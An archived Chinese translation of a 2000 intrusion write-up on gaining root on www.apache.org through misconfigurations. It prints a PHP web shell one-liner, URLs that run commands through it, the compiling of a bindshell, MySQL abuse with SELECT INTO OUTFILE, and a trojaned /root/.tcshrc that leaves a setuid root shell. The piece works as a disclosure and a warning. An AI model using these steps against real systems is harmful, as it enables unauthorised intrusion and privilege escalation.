---
title: "我们是如何攻破www.apache.org的"
date: 2000-05-06T00:00:00+08:00
tags: ["Security"]
draft: false
slug: "xfocus-article-35"
---

[quack](https://www.xfocus.net/bbs/index.php?lang=cn&act=Profile&do=03&MID=5) (quack_at_xfocus.org)

我们是如何攻破[www.apache.org](http://www.apache.org/)的


by  {} and Hardbeat

译： quack


一、写在前面


这篇文章并不是发现了什么最新的漏洞，它只是指出了一个普通的配置错误--甚至连apache.org

的工作人员也会配置错误:),所以这只是一个警告：修补你的系统，才能防止恶意侵袭。


二、介绍


这里描述了我们如何在一周内成功地得到了运行[www.apache.org](http://www.apache.org/)的机器的root权限

并且将其主页面上的Powered by Apache图样（羽毛状的图画）改成了Powered by 

Microsoft BackOffice的图样，没有做其它的任何改动了--除了帮他们赶跑了另外

(可能是恶意)的入侵者。


这里所描述的漏洞甚至不是apache相关的，它们仅仅是配置失误，其中之一是BugZilla

的……但它的开发者在README文件中对配置方法做了详尽的描述，所以――一切只

能是使用者自己的责任了，apache的用户不必为此而担心的:)。


我们对[www.apache.org](http://www.apache.org/)进行尝试的原因是有太多的服务器上跑的都是阿帕奇了，如果

它的主机是不安全的，那么入侵者就可能在它的源代码里放置后门，这会危及许多用

户的利益。


当然我们不愿看到这种事发生，所以我们帮apache补上了漏洞――当然在得到了ROOT

权限之后我们无法控制自己更改主页的欲望:)，开个小玩笑吧。


以下是整个入侵的过程：


1、ftproot == wwwroot

   o+w dirs

 

在寻找apache httpserver想要查看新版本是否存在缓冲溢出的过程中――我们连接上

了ftp:/ftp.apache.org――和[http://www.apache.org](http://www.apache.org/)是同一个目录并且有一个可写

的目录存在！


于是我们写了一个小脚本wuh.php3包含了下面的语句： 


<?

        passthru($cmd);

?>


将它上传到了那个可写的目录中。


2、Our commands executed

 

所以，很方便的，id这个命令可以被下面的语句调用：


      [http://www.apache.org/thatdir/wuh.php3?cmd=id](http://www.apache.org/thatdir/wuh.php3?cmd=id)


而后再上传一些bindshell的程序并用类似


      [http://www.apache.org/thatdir/wuh.php3?cmd=gcc+-o+httpd+httpd.c](http://www.apache.org/thatdir/wuh.php3?cmd=gcc+-o+httpd+httpd.c)


的语句来编译它，然后执行……


      [http://www.apache.org/thatdir/wuh.php3?cmd=./httpd](http://www.apache.org/thatdir/wuh.php3?cmd=./httpd)


3、The shell

 

我们使用的bindshell程序是有密码验证的:)，相对安全一些。


现在我们可以telnet到端口65533――我们定义的端口绑定处了，这样我们得到了本

地nobody权限的进入权――因为cgi是以nobody身份运行的。 


4、The apache.org box


在apache.org的机器里我们发现了:


        -o=rx /root 

        -o=rx homedirs

      

apache.org运行的是freebsd3.4的平台，我们不想仅仅通过缓冲区溢出或者乱七八糟

的exploit来得到root,让我们来试试仅仅通过他们自己配置的漏洞来得到最高权限吧！


5、Mysql


经过长时间的搜索，我们发现mysql是以root的权限运行的，并且可以本地运行，

因为apache.org还运行了bugzilla需要mysql帐号，并且将其用户名/密码明文存

放，所以很轻易的就可以获得mysql数据库的帐号密码。


我们下载了nportredird(从名字就可以知道应该是端口重定向的工具了)，并设置成

允许我的IP从23306端口接入并且重定向到本地的3306端口――这样我就能使用我的

mysql客户端了。


6、完全控制mysql，用它来建立文件

 

通过3306端口进入后，用bugs的帐号进入――BugZilla默认安装带来的安全问题之一吧……

包括以root身份运行mysqld……。


用'SELECT ... INTO OUTFILE;'的方法，我们可以在任何地方以root的身份建立文件，这

些文件将是666权限的，无法覆盖其它文件，但它仍然是有用的，你准备如何利用它呢？无

法用.rhosts――任何人可读的.rhosts,rshd是不允许连接运行的，所以rsh无法利用。


7、添加/root/.tcshrc


于是我们决定给他下个套:)，于是我们在root的文件夹建立一个文件/root/.tcshrc


      #!/bin/sh

      cp /bin/sh /tmp/.rootsh

      chmod 4755 /tmp/.rootsh

      rm -f /root/.tcshrc


      

8、ROOT!!


就这么简单，现在我们可以等待某人来运行su了，很幸运的――我们没有等太久，

就得到了一个suid的shell，成为root后的事情也是同样微不足道的――更改主页

并且给主机的管理员发送了Email通知了存在的漏洞。


9、修补ftproot==wwwroot的漏洞

 

进入系统后我们做的另一件是建立ftproot，将dist移至ftproot/dist并且将ftproot

指向这个目录，将可写的目录更改成入侵者无法利用的，保持FTP服务不变……


10、我们可以做什么?

 


还记得去年发生在ftp.win.tue.nl的事吗？有人在tcp_wrappers里放了木马:)，如果

我们想这么做的话，就可以将木马放在阿帕奇里――编辑源程序并让大家来下载这个

有木马后门的版本，很刺激，不是吗:)


11、简要回顾：


发现ftproot==webroot--->可写的目录允许上传php3脚本--->mysqld以root运行，而且

缺乏密码保护……这就是配置错误所在了。 


好了……一切顺利:)


---------------------------------------------------

译者注：


诚如作者所言，他们并没有利用什么最新漏洞，而仅仅是通过对webserver和数据库的一

些不当配置的利用，得到了系统的最高权限――事情还是发生在apache！呵，听来有些

夸张，但国内的情况呢……如果您关注系统安全的话，应该能知道的:(，不知道某些手

握大权的系统管理员们会不会多留点心……


敬请高手指点:mailto quack@antionline.org
